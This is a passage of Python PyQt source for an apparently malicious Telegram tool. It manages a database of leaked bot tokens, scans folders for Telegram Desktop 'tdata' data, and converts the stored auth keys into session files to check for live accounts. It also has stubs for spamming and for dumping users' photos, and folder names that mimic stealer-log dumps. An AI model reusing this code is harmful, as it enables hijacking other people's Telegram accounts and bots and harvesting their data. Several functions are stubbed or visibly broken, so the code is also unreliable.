            bot = telebot.TeleBot(self.get_current_token())
            try:
                with open(file_name, 'rb') as animation:
                    result = bot.send_animation(self.get_current_chat_id(), animation)
                self.console_text_edit_2.append(f"Animation sent: {result.message_id}")
            except Exception as e:
                QMessageBox.warning(self, 'Error', f"Failed to send animation: {str(e)}")
        else:
            self.console_text_edit_2.append("Animation sending cancelled")

    def send_files_function(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Send", "", "All Files (*)")
        if file_path:
            try:
                bot = telebot.TeleBot(self.get_current_token())
                with open(file_path, 'rb') as file:
                    result = bot.send_document(self.get_current_chat_id(), InputFile(file))
                self.console_text_edit_2.append(f"File sent: {result.document.file_name}")
            except Exception as e:
                QMessageBox.warning(self, 'Error', f"Failed to send file: {str(e)}")
        else:
            self.console_text_edit_2.append("File sending cancelled")

    def send_audio_function(self):
        audio_path, _ = QFileDialog.getOpenFileName(self, "Select Audio File", "", "Audio Files (*.mp3 *.wav *.ogg);;All Files (*)")
        if audio_path:
            try:
                bot = telebot.TeleBot(self.get_current_token())
                with open(audio_path, 'rb') as audio:
                    result = bot.send_audio(self.get_current_chat_id(), InputFile(audio))
                self.console_text_edit_2.append(f"Audio sent: {result.audio.file_name}")
            except Exception as e:
                QMessageBox.warning(self, 'Error', f"Failed to send audio: {str(e)}")
        else:
            self.console_text_edit_2.append("Audio sending cancelled")

    def send_contact_function(self):
        phone_number, ok1 = QInputDialog.getText(self, 'Send Contact', 'Enter phone number:')
        if ok1:
            first_name, ok2 = QInputDialog.getText(self, 'Send Contact', 'Enter first name:')
            if ok2:
                last_name, ok3 = QInputDialog.getText(self, 'Send Contact', 'Enter last name (optional):')
                if ok3:
                    try:
                        bot = telebot.TeleBot(self.get_current_token())
                        result = bot.send_contact(self.get_current_chat_id(), phone_number, first_name, last_name)
                        self.console_text_edit_2.append(f"Contact sent: {result.contact.first_name} {result.contact.last_name}")
                    except Exception as e:
                        QMessageBox.warning(self, 'Error', f"Failed to send contact: {str(e)}")
                else:
                    self.console_text_edit_2.append("Contact sending cancelled")
            else:
                self.console_text_edit_2.append("Contact sending cancelled")
        else:
            self.console_text_edit_2.append("Contact sending cancelled")

    def send_poll_function(self):
        question, ok1 = QInputDialog.getText(self, 'Send Poll', 'Enter poll question:')
        if ok1:
            options, ok2 = QInputDialog.getText(self, 'Send Poll', 'Enter options (comma-separated):')
            if ok2:
                try:
                    bot = telebot.TeleBot(self.get_current_token())
                    result = bot.send_poll(self.get_current_chat_id(), question, options.split(','))
                    self.console_text_edit_2.append(f"Poll sent: {result.poll.question}")
                except Exception as e:
                    QMessageBox.warning(self, 'Error', f"Failed to send poll: {str(e)}")
            else:
                self.console_text_edit_2.append("Poll sending cancelled")
        else:
            self.console_text_edit_2.append("Poll sending cancelled")

    def send_photo_function(self):
        photo_path, _ = QFileDialog.getOpenFileName(self, "Select Photo", "", "Image Files (*.png *.jpg *.bmp);;All Files (*)")
        if photo_path:
            try:
                bot = telebot.TeleBot(self.get_current_token())
                with open(photo_path, 'rb') as photo:
                    result = bot.send_photo(self.get_current_chat_id(), InputFile(photo))
                self.console_text_edit_2.append(f"Photo sent: {result.photo[-1].file_id}")
            except Exception as e:
                QMessageBox.warning(self, 'Error', f"Failed to send photo: {str(e)}")
        else:
            self.console_text_edit_2.append("Photo sending cancelled")

    def send_video_function(self):
        video_path, _ = QFileDialog.getOpenFileName(self, "Select Video", "", "Video Files (*.mp4 *.avi *.mov);;All Files (*)")
        if video_path:
            try:
                bot = telebot.TeleBot(self.get_current_token())
                with open(video_path, 'rb') as video:
                    result = bot.send_video(self.get_current_chat_id(), InputFile(video))
                self.console_text_edit_2.append(f"Video sent: {result.video.file_name}")
            except Exception as e:
                QMessageBox.warning(self, 'Error', f"Failed to send video: {str(e)}")
        else:
            self.console_text_edit_2.append("Video sending cancelled")

    def send_paid_content_function(self):
        title, ok1 = QInputDialog.getText(self, 'Send Paid Content', 'Enter content title:')
        if ok1:
            description, ok2 = QInputDialog.getText(self, 'Send Paid Content', 'Enter content description:')
            if ok2:
                price, ok3 = QInputDialog.getInt(self, 'Send Paid Content', 'Enter price (in cents):', 100, 1, 10000)
                if ok3:
                    try:
                        bot = telebot.TeleBot(self.get_current_token())
                        result = bot.send_invoice(
                            self.get_current_chat_id(), title, description, 'invoice_payload',
                            'payment_token', 'USD', [telebot.types.LabeledPrice(label=title, amount=price)]
                        )
                        self.console_text_edit_2.append(f"Paid content invoice sent: {result.invoice.title}")
                    except Exception as e:
                        QMessageBox.warning(self, 'Error', f"Failed to send paid content invoice: {str(e)}")
                else:
                    self.console_text_edit_2.append("Paid content sending cancelled")
            else:
                self.console_text_edit_2.append("Paid content sending cancelled")
        else:
            self.console_text_edit_2.append("Paid content sending cancelled")

    def set_reaction_function(self):
        message_id, ok1 = QInputDialog.getInt(self, 'Set Reaction', 'Enter message ID:', 1, 1)
        if ok1:
            reaction, ok2 = QInputDialog.getText(self, 'Set Reaction', 'Enter reaction (emoji):')
            if ok2:
                try:
                    bot = telebot.TeleBot(self.get_current_token())
                    result = bot.set_message_reaction(
                        self.get_current_chat_id(), message_id, [ReactionType(type="emoji", emoji=reaction)]
                    )
                    self.console_text_edit_2.append(f"Reaction set: {reaction} on message {message_id}")
                except Exception as e:
                    QMessageBox.warning(self, 'Error', f"Failed to set reaction: {str(e)}")
            else:
                self.console_text_edit_2.append("Reaction setting cancelled")
        else:
            self.console_text_edit_2.append("Reaction setting cancelled")

    def set_chat_action_function(self):
        actions = ['typing', 'upload_photo', 'record_video', 'upload_video', 'record_audio', 
                   'upload_audio', 'upload_document', 'find_location', 'record_video_note', 'upload_video_note']
        action, ok = QInputDialog.getItem(self, 'Set Chat Action', 'Select chat action:', actions, 0, False)
        if ok and action:
            try:
                bot = telebot.TeleBot(self.get_current_token())
                bot.send_chat_action(self.get_current_chat_id(), action)
                self.console_text_edit_2.append(f"Chat action set: {action}")
            except Exception as e:
                QMessageBox.warning(self, 'Error', f"Failed to set chat action: {str(e)}")
        else:
            self.console_text_edit_2.append("Chat action setting cancelled")

    def load_usernames(self, filepath):
        pass

    async def start_spam_function(self):
        pass

    def convert_tdata(self, tdata_path):
        sessions = []
        
        try:
            # Iterate through all folders in the tdata directory
            for folder in os.listdir(tdata_path):
                folder_path = os.path.join(tdata_path, folder)
                if os.path.isdir(folder_path):
                    # Check for the presence of 'tdata' files
                    if 'auth_key' in os.listdir(folder_path):
                        # Read the auth_key file
                        with open(os.path.join(folder_path, 'auth_key'), 'rb') as f:
                            auth_key = f.read()
                        
                        # Read the dc_id file
                        with open(os.path.join(folder_path, 'dc'), 'r') as f:
                            dc_id = int(f.read())
                        
                        # Create a session dictionary
                        session = {
                            'dc_id': dc_id,
                            'auth_key': AuthKey(data=auth_key),
                            'user_id': None,  # We'll need to fetch this separately
                            'entities': {}
                        }
                        
                        # If available, read the user ID from the user_id file
                        user_id_path = os.path.join(folder_path, 'user_id')
                        if os.path.exists(user_id_path):
                            with open(user_id_path, 'r') as f:
                                session['user_id'] = int(f.read())
                        
                        sessions.append(session)
            
            print(f"Converted {len(sessions)} tdata sessions")
            return sessions
        
        except Exception as e:
            print(f"Error converting tdata: {e}")
            return []
    
    def save_sessions(self, sessions, output_dir):
        os.makedirs(output_dir, exist_ok=True)
        for i, session in enumerate(sessions):
            filename = f"session_{i+1}.session"
            filepath = os.path.join(output_dir, filename)
            
            # Create a new SQLite database for the session
            with sqlite3.connect(filepath) as conn:
                c = conn.cursor()
                
                # Create necessary tables
                c.execute("""CREATE TABLE sessions 
                            (dc_id INTEGER PRIMARY KEY, server_address TEXT, port INTEGER, auth_key BLOB)""")
                c.execute("""CREATE TABLE entities 
                            (id INTEGER PRIMARY KEY, hash INTEGER, username TEXT, phone TEXT, name TEXT)""")
                
                # Insert session data
                c.execute("INSERT INTO sessions VALUES (?, ?, ?, ?)", 
                        (session['dc_id'], "", 0, session['auth_key'].key))
                
                # Insert entity data if available
                for entity_id, entity in session['entities'].items():
                    c.execute("INSERT INTO entities VALUES (?, ?, ?, ?, ?)",
                            (entity_id, entity.hash, entity.username, entity.phone, entity.name))
                
                conn.commit()
            
            print(f"Saved session to {filepath}")

    def updateTokenCount(self):
        pass

            
    def live_session_function(self, tdata_directory_path, tdata_console_textedit):
        root_directory = os.path.dirname(os.path.abspath(__file__))
        root_tdata_path = os.path.join(root_directory, "Tdata")
        self.tdata_manager_tab.tdata_console_textedit.append("Starting to copy Tdata contents...")
        if not os.path.exists(root_tdata_path):
            os.makedirs(root_tdata_path)
            self.tdata_manager_tab.tdata_console_textedit.append(f"Created root Tdata directory at: {root_tdata_path}")
        else:
            self.tdata_manager_tab.tdata_console_textedit.append(f"Root Tdata directory already exists at: {root_tdata_path}")
        for folder_name in os.listdir(tdata_directory_path):
            folder_path = os.path.join(tdata_directory_path, folder_name)
        
            if os.path.isdir(folder_path):
                destination_path = os.path.join(root_tdata_path, folder_name)
                self.tdata_manager_tab.tdata_console_textedit.append(f"Copying contents of folder: {folder_name}")
                try:
                    shutil.copytree(folder_path, destination_path)
                    self.tdata_manager_tab.tdata_console_textedit.append(f"Successfully copied {folder_name} to {destination_path}")
                except Exception as e:
                    self.tdata_manager_tab.tdata_console_textedit.append(f"Error copying {folder_name}: {str(e)}")
            else:
                self.tdata_manager_tab.tdata_console_textedit.append(f"Skipping {folder_name}, not a directory.")
        self.tdata_manager_tab.tdata_console_textedit.append("Finished copying Tdata contents.")
        
    def generate_function(self):
        self.tdata_treeWidget.clear()
        self.tdata_treeWidget.setColumnCount(12)
        self.tdata_treeWidget.setHeaderLabels([
            "Date", "Root Folder", "User ID", "Username", "Phone Number",
            "Groups", "Channels", "Admin Rights", "Spam Blocked",
            "Crypto Wallet", "Owned Groups", "Owned Bots"
        ])
    
        items_data = []
        for i in range(20):  # Generate 20 items
            date = f"07/{random.randint(1, 31):02d}/2024"
            root_folder = f"US_{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" + \
                          f"WWQJLLS81YSR8GNNM"
            user_id = random.randint(10000000, 99999999)
            username = self.get_random_username()
            phone_number = f"+1{random.randint(1000000000, 9999999999)}"
            groups = random.randint(0, 200)
            channels = random.randint(0, 100)
            admin_rights = f"✅ {random.randint(0, 20)}"
            spam_blocked = "✅" if random.choice([True, False]) else "❌"
            crypto_wallet = "Enabled" if random.choice([True, False]) else "Disabled"
            owned_groups = f"{random.randint(1, 20)} Ownerships"
            owned_bots = f"{random.randint(1, 10)} Bots"

            items_data.append([
                date, root_folder, str(user_id), username, phone_number,
                str(groups), str(channels), admin_rights, spam_blocked,
                crypto_wallet, owned_groups, owned_bots
            ])
    
        for data in items_data:
            QTreeWidgetItem(self.tdata_treeWidget, data)
    
        self.tdata_treeWidget.expandAll()



    def generate_obscured_username(self):
        prefix = ''.join(random.choices(string.ascii_letters, k=5))
        suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=3))
        obscured_suffix = '*' * len(suffix)
        return f"@{prefix}{obscured_suffix}"

    def initiate_search(self):
        self.update_tdata_console("Search will begin in 5 seconds...")
        QTimer.singleShot(5000, self.start_function)  # 5000 ms = 5 seconds

    def start_function(self):
        directory_path = self.tdata_directory_path_text_edit.toPlainText()
        if not directory_path:
            self.update_tdata_console("Error: Please select a directory first.")
            return
        self.update_tdata_console(f"Searching in: {directory_path}")
        self.progressBar.setValue(0)
        self.timer.start(100)  # Update every 100 ms
        tdata_count = 0
        total_dirs = sum([len(dirs) for _, dirs, _ in os.walk(directory_path)])
        processed_dirs = 0
        
        string_sessions = {}  # Initialize the dictionary here
        
        for root, dirs, files in os.walk(directory_path):
            for dir_name in dirs:
                if dir_name.lower() in ['tdata', 'Profile_1']:
                    tdata_count += 1
                    full_path = os.path.join(root, dir_name)
                    self.update_tdata_console(f"Found: {full_path}")
                    # Assuming you want to use the directory name as the key and full path as the value
                    string_sessions[dir_name] = full_path
                processed_dirs += 1
                self.progressBar.setValue(int((processed_dirs / total_dirs) * 100))
                QApplication.processEvents()  # Allow GUI to update
        
        self.tdata_total_lcdNumber.display(tdata_count)
        self.update_tdata_console(f'Search complete. Found {len(string_sessions)} sessions.')
        self.update_tdata_console('Starting to check for live sessions...')
    
        # Make sure 'sem' is defined before this point
        sem = asyncio.Semaphore(10)  # Adjust the number as needed
        
        tasks = [self.check_sess(p, s, sem) for s, p in string_sessions.items()]
        results = asyncio.run(asyncio.gather(*tasks, return_exceptions=True))
    
        self.tdata_console_textedit.clear()
        for result in results:
            self.tdata_console_textedit.append(str(result))

    async def check(self, tdata_path: str, sess: str, sem: Semaphore):
        # Your check logic here
        pass



    async def process_tdata(self, directory_path: str):
        sem = Semaphore(10)  # Limit the number of concurrent tasks
    
        self.update_tdata_console('Starting to look for folders called "tdata"')
        tdatas = []
        for dirpath, dirnames, filenames in os.walk(directory_path):
            folder_name = os.path.split(dirpath)[1]
            if folder_name == 'tdata' or 'Profile_' in folder_name:
                tdatas.append(dirpath)
    
        self.update_tdata_console(f'Found {len(tdatas)} tdata, start converting to sessions')
        string_sessions = {}
        for tdata in tdatas:
            try:
                for s in self.convert_tdata(tdata):
                    string_sessions[s] = tdata
            except Exception as e:
                self.update_tdata_console(f'Error converting tdata: {e}')
                continue
    
        self.update_tdata_console(f'Search complete. Found {len(string_sessions)} sessions.')
        self.update_tdata_console('Starting to check for live sessions...')
    
        tasks = [self.check_sess(p, s, sem) for s, p in string_sessions.items()]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
        self.tdata_console_textedit.clear()
        for result in results:
            if isinstance(result, Exception):
                self.update_tdata_console(f'Error: {result}')
            else:
                self.tdata_console_textedit.append(str(result))


    def on_start_button_clicked(self):
        directory_path = self.tdata_directory_path_text_edit.toPlainText().strip()
        if not directory_path:
            self.update_tdata_console("Error: Please select a directory first.")
            return
        self.update_tdata_console(f"Searching in: {directory_path}")

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.process_tdata(directory_path))
        loop.close()

    async def start_process_tdata(self, directory_path: str):
        self.update_tdata_console("Process tdata will begin in 5 seconds...")
        await asyncio.sleep(5)
        await self.process_tdata(directory_path)

    def update_progress_bar(self):
        current_value = self.progressBar.value()
        if current_value < 100:
            self.progressBar.setValue(current_value + 1)


    def loadTdataDirectory(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Directory")
        if directory:
            self.tdata_directory_path_text_edit.setText(directory)


    def displaySuccessMessage(self, message):
        self.console_text_edit_2.append(message)

    def displayErrorMessage(self, message):
        self.console_text_edit_2.append(message)

    def launch_bot(self):
        TOKEN = self.bot_manager_text_input.toPlainText()

        if not TOKEN:
            error_msg = "Bot token is not defined. Please submit a bot token to manage."
            self.displayErrorMessage(error_msg)
            return

        user_id = self.telegram_chat_id_text_input.toPlainText()
        result = launch_bot(TOKEN, user_id)

        if result.startswith("Failed"):
            self.displayErrorMessage(result)
        else:
            self.displaySuccessMessage(result)

    def sendDocument_function(self):
        try:
            TOKEN = self.bot_manager_text_input.toPlainText()
            chat_id = self.telegram_chat_id_text_input.toPlainText()

            script_dir = os.path.dirname(os.path.realpath(__file__))
            documents_dir = os.path.join(script_dir, "Documents")

            bot = telebot.TeleBot(TOKEN)

            for filename in os.listdir(documents_dir):
                file_path = os.path.join(documents_dir, filename)

                if os.path.isfile(file_path):
                    with open(file_path, "rb") as document:
                        bot.send_document(chat_id, document)

            self.displaySuccessMessage("Document sent successfully.")

        except telebot.apihelper.ApiException as e:
            self.displayErrorMessage(f"Failed to send the document. Error: {str(e)}")

    def sendMessage_function(self):
        try:
            TOKEN = self.bot_manager_text_input.toPlainText()
            message = self.console_text_response_input.toPlainText()
            bot = telebot.TeleBot(TOKEN)
            all_users = retrieve_all_users()
    
            for user in all_users:
                chat_id = user.chat_id
                bot.send_message(chat_id, message)
    
            self.console_text_edit_2.append(f"Message sent successfully to all subscribed users.")
    
        except telebot.TeleBotException:
            self.console_text_edit_2.append("Failed to send the message. Please try again.")
    
    async def dumpPhoto_function(bot, user):
        user_id = str(user.id)
        user_dir = os.path.join(base_path, user_id)
        result = await safe_api_request(bot(GetUserPhotosRequest(user_id=user.id,offset=0,max_id=0,limit=100)), 'get user photos')
        if not result:
            return
        for photo in result.photos:
            print(f"Saving photo {photo.id}...")
            await safe_api_request(bot.download_file(photo, os.path.join(user_dir, f'{photo.id}.jpg')), 'download user photo')
    
    
    async def save_media_photo(bot, chat_id, photo):
        user_media_dir = os.path.join(base_path, chat_id, 'media')
        await safe_api_request(bot.download_file(photo, os.path.join(user_media_dir, f'{photo.id}.jpg')), 'download media photo')

    def stop_function(self):
        try:
            process_id = "your_process_id_here"
            os.kill(process_id, signal.SIGTERM)
            self.displaySuccessMessage("Process stopped successfully.")
        except OSError:
            self.displayErrorMessage("Failed to stop the process.")


    def displayJSON(self, json_data):
        formatted_json = json.dumps(json_data, indent=4, ensure_ascii=False)
        self.console_text_edit_2.append(formatted_json)

    def handleUserResponse(self):
        user_response = self.console_text_response_input.toPlainText()
        self.console_text_edit_2.append(f"Hacker's response: {user_response}")

        if user_response.upper() == 'Y':
            token = self.single_token_submittion_text_input.toPlainText()
            additional_argument = None  # Replace with the additional argument you want to pass if needed
            self.addToDatabase(token, additional_argument)


    def saveBotToDatabase(self, token, bot_name, username, status, submission_date, dumped):
        connection = sqlite3.connect("data\database.db")
        cursor = connection.cursor()
    
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS bots 
            (token TEXT, bot_name TEXT, username TEXT, status TEXT, 
            submission_date TEXT, last_checked_date TEXT, last_dumped_date TEXT)
        """)
    
        cursor.execute("""
            INSERT INTO bots 
            (token, bot_name, username, status, submission_date, last_checked_date, last_dumped_date) 
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (token, bot_name, username, status, submission_date, "", ""))
    
        connection.commit()
        cursor.close()
        connection.close()

    def checkTelegramBotStatus(self):
        token = self.single_token_submittion_text_input.toPlainText()
        url = f"https://api.telegram.org/bot{token}/getMe"
        
        if self.isTokenDuplicate(token):
            QMessageBox.warning(self, "Duplicate Token", "This token already exists in the database.")
            return
        
        try:
            response = requests.get(url)
            response.raise_for_status()
    
            if response.status_code == 200:
                json_data = json.loads(response.content)
                bot_info = json_data["result"]
                
                # Prepare detailed bot information
                bot_details = f"Bot Details:\n"
                bot_details += f"ID: {bot_info.get('id', 'N/A')}\n"
                bot_details += f"Name: {bot_info.get('first_name', 'N/A')}\n"
                bot_details += f"Username: @{bot_info.get('username', 'N/A')}\n"
                bot_details += f"Can Join Groups: {'Yes' if bot_info.get('can_join_groups', False) else 'No'}\n"
                bot_details += f"Can Read Group Messages: {'Yes' if bot_info.get('can_read_all_group_messages', False) else 'No'}\n"
                bot_details += f"Supports Inline Queries: {'Yes' if bot_info.get('supports_inline_queries', False) else 'No'}"
    
                self.displaySuccessMessage(f"Telegram Bot is online!\n\n{bot_details}")
                
                bot_name = bot_info.get("first_name", "")
                username = bot_info.get("username", "")
                
                reply = QMessageBox.question(self, "Save Token", "Do you want to save the token to the database?", 
                                            QMessageBox.Yes | QMessageBox.No)
                if reply == QMessageBox.Yes:
                    self.addToDatabase(token, bot_name, username)
                else:
                    self.displaySuccessMessage("Token not saved to the database.")
            else:
                self.displayErrorMessage("Invalid token. Please provide a valid token.")
        except requests.exceptions.RequestException as e:
            error_msg = f"An error occurred during the request:\n{str(e)}"
            self.displayErrorMessage(error_msg)

    def addToken(self, token, bot_name=None, username=None):
        if self.isTokenDuplicate(token):
            QMessageBox.warning(self, "Duplicate Token", "This token already exists in the database.")
            return False
    
        status = "Online"
        submission_date = datetime.date.today().strftime('%Y-%m-%d')
        last_dumped_date = ""
    
        try:
            connection = sqlite3.connect('data\database.db')
            cursor = connection.cursor()
            cursor.execute("""
                INSERT INTO TOKENS (token, bot_name, username, status, submission_date, last_dumped_date)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (token, bot_name, username, status, submission_date, last_dumped_date))
            connection.commit()
    
            row_count = self.tableWidget.rowCount()
            self.tableWidget.insertRow(row_count)
            self.tableWidget.setItem(row_count, 0, QTableWidgetItem(submission_date))
            self.tableWidget.setItem(row_count, 1, QTableWidgetItem(token))
            self.tableWidget.setItem(row_count, 2, QTableWidgetItem(bot_name or ""))
            self.tableWidget.setItem(row_count, 3, QTableWidgetItem(username or ""))
            self.tableWidget.setItem(row_count, 4, QTableWidgetItem(status))
            self.tableWidget.setItem(row_count, 5, QTableWidgetItem(last_dumped_date))
    
            self.updateTokenCount()  # Assuming you have this method to update the token count display
            QMessageBox.information(self, "Success", "Token added successfully.")
            return True
    
        except sqlite3.Error as e:
            QMessageBox.critical(self, "Error", f"Failed to add token: {str(e)}")
            return False
        finally:
            connection.close()



    def loadBotsFromDatabase(self):
        # Clear the existing table
        self.tableWidget.setRowCount(0)
        
        try:
            # Fetch all tokens from the database
            tokens = get_all_tokens()
            
            # Populate the table
            for token_data in tokens:
                row_position = self.tableWidget.rowCount()
                self.tableWidget.insertRow(row_position)
                
                # Populate each column according to the provided structure
                self.tableWidget.setItem(row_position, 0, QTableWidgetItem(str(token_data['id'])))
                self.tableWidget.setItem(row_position, 1, QTableWidgetItem(token_data['token']))
                self.tableWidget.setItem(row_position, 2, QTableWidgetItem(token_data['bot_name'] or ''))
                self.tableWidget.setItem(row_position, 3, QTableWidgetItem(token_data['username'] or ''))
                self.tableWidget.setItem(row_position, 4, QTableWidgetItem(token_data['status'] or ''))
                self.tableWidget.setItem(row_position, 5, QTableWidgetItem(token_data['submission_date'] or ''))
                self.tableWidget.setItem(row_position, 6, QTableWidgetItem(token_data['last_dumped_date'] or ''))
            
            # Update the token count
            self.updateTokenCount()
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load bots from database: {str(e)}")

    def openDatabaseFileDialog(self):
        file_dialog = QFileDialog()
        file_dialog.setFileMode(QFileDialog.ExistingFile)
        file_dialog.setNameFilter("Database files (*.db)")
        file_dialog.setDirectory(os.getcwd())

        if file_dialog.exec_():
            file_path = file_dialog.selectedFiles()[0]
            self.loadDatabaseFile(file_path)

    def loadDatabaseFile(self, file_path):
        connection = sqlite3.connect(file_path)
        cursor = connection.cursor()

        cursor.execute("SELECT * FROM bots")
        bot_records = cursor.fetchall()

        self.tableWidget.setRowCount(0)
        for i, bot in enumerate(bot_records):
            self.tableWidget.insertRow(i)
            self.tableWidget.setItem(i, 0, QTableWidgetItem(str(i + 1)))
            self.tableWidget.setItem(i, 0, QTableWidgetItem(bot[0]))
            self.tableWidget.setItem(i, 1, QTableWidgetItem(bot[1]))
            self.tableWidget.setItem(i, 2, QTableWidgetItem(bot[2]))
            self.tableWidget.setItem(i, 3, QTableWidgetItem(bot[3]))
            self.tableWidget.setItem(i, 4, QTableWidgetItem(bot[4]))
            self.tableWidget.setItem(i, 5, QTableWidgetItem(bot[5]))
            self.tableWidget.setItem(i, 6, QTableWidgetItem(bot[6]))

        cursor.close()
        connection.close()

    def displayStatsAndCounts(self):
        connection = sqlite3.connect("data\database.db")
        cursor = connection.cursor()

        cursor.execute("SELECT COUNT(*) FROM TOKENS")
        total_bots_count = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM TOKENS WHERE status = 'Online'")
        online_bots_count = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM TOKENS WHERE status = 'Offline'")
        offline_bots_count = cursor.fetchone()[0]

        today_date = datetime.date.today().strftime('%Y-%m-%d')
        cursor.execute("SELECT COUNT(*) FROM TOKENS WHERE last_checked_date = ?", (today_date,))
        today_checked_bots_count = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM TOKENS WHERE last_dumped_date = ?", (today_date,))
        today_dumped_bots_count = cursor.fetchone()[0]

        stats_text = f"Total Bots count: {total_bots_count}\n"
        stats_text += f"Online Bots count: {online_bots_count}\n"
        stats_text += f"Offline Bots count: {offline_bots_count}\n"
        stats_text += f"Bots Checked today: {today_checked_bots_count}\n"
        stats_text += f"Bots Dumped today: {today_dumped_bots_count}\n"

        cursor.close()
        connection.close()




######--------------------------------------------------------------##########
######--------------- CONTEXT MENU OPTIONS --------------------##########

    def showContextMenu(self, point):
        menu = QtWidgets.QMenu(self)
        
        tdata_manager_tab_action = menu.addAction("Token Manager")
        session_manager_action = menu.addAction("Sesssion Manager")
    
        action = menu.exec_(self.mapToGlobal(point))
    
        if action == tdata_manager_tab_action:
            self.token_manager_ContextMenu(point)
        elif action == session_manager_action:
            self.session_manager_TabContextMenu(point)
    
    def token_manager_ContextMenu(self, point):
        menu = QtWidgets.QMenu(self)
        
        refresh_action = menu.addAction("Refresh Token")
        remove_action = menu.addAction("Remove Token")
        view_action = menu.addAction("View Token")
    
        action = menu.exec_(self.mapToGlobal(point))
    
        if action == refresh_action:
            self.refreshToken()
        elif action == remove_action:
            self.removeToken()
        elif action == view_action:
            self.viewToken()

        def token_manager_ContextMenu(self, point):
            context_menu = QMenu(self)
            remove_action = context_menu.addAction("Remove Token")
            action = context_menu.exec_(self.tableWidget.mapToGlobal(point))
            if action == remove_action:
                self.removeToken()
    
    
    
    def removeToken(self):
        selected_items = self.tableWidget.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "No token selected")
            return
    
        row = selected_items[0].row()
        token = self.tableWidget.item(row, self.TOKEN_COLUMN).text()
    
        reply = QMessageBox.question(self, 'Remove Token', f"Are you sure you want to remove the token: {token}?",
                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            try:
                # Remove from database
                from data.database import remove_token
                if remove_token(token):
                    # Remove from table widget
                    self.tableWidget.removeRow(row)
                    self.updateTokenCount()  # Update the LCD display
                    QMessageBox.information(self, "Success", f"Token {token} removed successfully")
                else:
                    QMessageBox.warning(self, "Warning", f"Token {token} not found in the database")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to remove token: {str(e)}")






    def getBotInfo(self, token):
        try:
            url = f"https://api.telegram.org/bot{token}/getMe"
            response = requests.get(url)
            
            if response.status_code == 200:
                json_data = response.json()
                if json_data.get("ok"):
                    return json_data.get("result", {})
                else:
                    return "Error: " + json_data.get("description", "Unknown error")
            else:
                return f"Error: HTTP {response.status_code}"
        except Exception as e:
            return f"Error: {str(e)}"


    def mousePressEvent(self, event):
        
        super().mousePressEvent(event)
    
    def viewToken(self):
        selected_rows = self.tableWidget.selectedItems()
        row = selected_rows[0].row() if selected_rows else -1
    
        if row != -1:
            token = self.tableWidget.item(row, 1).text()
            
            # Fetch bot information
            bot_info = self.getBotInfo(token)
            
            if isinstance(bot_info, dict):
                # Get conversation and message count estimate
                conversation_count, message_count = self.getMessageAndConversationCount(token)
                
                # Create custom dialog
                dialog = QtWidgets.QDialog(self)
                dialog.setWindowTitle("Bot Information")
                layout = QtWidgets.QVBoxLayout(dialog)
    
                # Create a form layout for bot details
                form_layout = QtWidgets.QFormLayout()
                self.addClickableRow(form_layout, "Token:", token)
                self.addClickableRow(form_layout, "Bot Name:", bot_info.get('first_name', 'N/A'))
                self.addClickableRow(form_layout, "Bot Username:", '@' + bot_info.get('username', 'N/A'))
                self.addClickableRow(form_layout, "Bot ID:", str(bot_info.get('id', 'N/A')))
                self.addClickableRow(form_layout, "Can Join Groups:", str(bot_info.get('can_join_groups', 'N/A')))
                self.addClickableRow(form_layout, "Can Read Group Messages:", str(bot_info.get('can_read_all_group_messages', 'N/A')))
                self.addClickableRow(form_layout, "Supports Inline Queries:", str(bot_info.get('supports_inline_queries', 'N/A')))
                self.addClickableRow(form_layout, "Estimated Conversations:", str(conversation_count))
                self.addClickableRow(form_layout, "Estimated Messages:", str(message_count))
                
                # Add form layout to main layout
                layout.addLayout(form_layout)
    
                # Create button box with OK and Copy buttons
                button_box = QtWidgets.QDialogButtonBox(QtWidgets.QDialogButtonBox.Ok)
                copy_button = QtWidgets.QPushButton("Copy All Info")
                button_box.addButton(copy_button, QtWidgets.QDialogButtonBox.ActionRole)
                layout.addWidget(button_box)
    
                # Connect buttons
                button_box.accepted.connect(dialog.accept)
                copy_button.clicked.connect(lambda: self.copyAllInfo(token, bot_info, conversation_count, message_count))
    
                # Show dialog
                dialog.exec_()
            else:
                QtWidgets.QMessageBox.warning(self, "Error", f"Failed to fetch bot info: {bot_info}")
    
    def getConversationCount(self, token):
        try:
            url = f"https://api.telegram.org/bot{token}/getUpdates"
            response = requests.get(url)
            
            if response.status_code == 200:
                json_data = response.json()
                if json_data.get("ok"):
                    unique_chats = set()
                    for update in json_data.get("result", []):
                        if "message" in update:
                            chat_id = update["message"]["chat"]["id"]
                            unique_chats.add(chat_id)
                    return len(unique_chats)
                else:
                    return "Error: " + json_data.get("description", "Unknown error")
            else:
                return f"Error: HTTP {response.status_code}"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def copyAllInfo(self, token, bot_info, conversation_count, message_count):
        # Prepare all information to copy
        info_to_copy = (
            f"Token: {token}\n"
            f"Bot Name: {bot_info.get('first_name', 'N/A')}\n"
            f"Bot Username: @{bot_info.get('username', 'N/A')}\n"
            f"Bot ID: {bot_info.get('id', 'N/A')}\n"
            f"Can Join Groups: {bot_info.get('can_join_groups', 'N/A')}\n"
            f"Can Read Group Messages: {bot_info.get('can_read_all_group_messages', 'N/A')}\n"
            f"Supports Inline Queries: {bot_info.get('supports_inline_queries', 'N/A')}\n"
            f"Estimated Conversations: {conversation_count}\n"
            f"Estimated Messages: {message_count}\n"
        )
        
        # Copy to clipboard
        clipboard = QtWidgets.QApplication.clipboard()
        clipboard.setText(info_to_copy)
        
        # Show confirmation message
        QtWidgets.QMessageBox.information(self, "Copy Info", "All information copied to clipboard!")

    
    def addClickableRow(self, layout, label, value):
        value_label = ClickableLabel(value)
